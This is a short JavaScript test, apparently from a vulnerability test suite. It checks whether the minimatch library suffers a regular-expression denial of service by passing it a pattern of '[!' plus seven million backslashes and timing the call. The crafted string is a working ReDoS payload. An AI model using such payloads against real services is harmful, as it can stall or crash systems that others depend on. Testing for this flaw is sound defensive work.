// test("ReDos in minimatch", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  const minimatch = require("minimatch");
  let attack_str = "[!" + genstr(7000000, "\\") + "A";
  let t = measureTime(function () {
    minimatch("foo", attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
